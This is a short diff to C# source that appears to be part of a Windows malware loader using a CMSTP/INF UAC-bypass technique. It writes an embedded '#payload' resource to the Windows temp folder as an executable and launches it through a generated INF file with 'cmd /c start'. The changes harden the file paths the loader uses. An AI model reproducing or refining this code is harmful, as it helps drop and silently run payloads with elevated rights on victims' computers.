@@ -56,7 +56,7 @@ ShortSvcName=""NyanCat""
     public static string SetInfFile(string CommandToExecute)
     {
         string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string TemporaryDir = "C:\\windows\\temp";
+        string TemporaryDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp";
         StringBuilder OutputFile = new StringBuilder();
         OutputFile.Append(TemporaryDir);
         OutputFile.Append("\\");
@@ -72,7 +72,7 @@ ShortSvcName=""NyanCat""
     {
         try
         {
-            string tempFile = Path.GetTempFileName() + "#exe";
+            string tempFile = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp\\" + Path.GetRandomFileName().Split(Convert.ToChar("."))[0] + "#exe";
             File.WriteAllBytes(tempFile, GetResource("#payload"));
             StringBuilder InfFile = new StringBuilder();
             InfFile.Append(SetInfFile("cmd /c start \"" + tempFile + "\""));
